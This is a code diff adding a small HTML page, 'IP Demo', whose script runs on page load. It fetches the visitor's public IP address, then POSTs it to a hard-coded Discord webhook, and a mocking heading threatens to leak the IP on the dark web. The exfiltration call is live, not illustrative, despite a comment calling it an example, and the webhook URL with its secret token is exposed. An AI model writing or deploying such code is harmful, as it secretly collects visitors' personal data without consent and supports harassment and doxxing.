@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Demo</title>
+</head>
+<body>
+    <h1>Wsp, now i got your ip, time to leak it in the dark web.</h1>
+    <p id="ip">Loading...</p>
+
+    <script>
+        fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+    document.getElementById("ip").textContent = data.ip;
+    console.log("Your IP:", data.ip);
+
+    const message = `IP: ${data.ip}`;
+
+    // Example POST request structure
+    fetch("https://discord.com/api/webhooks/1512027877842092123/HSn4HBvKWJ999kVn5SEe6FtSUa6mxWbK4RsbLGlIU0AGt6jiWNpvRbgG_JnFN-ElaZ6P", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: message
+      })
+    });
+  });
+    </script>
+</body>
+</html>
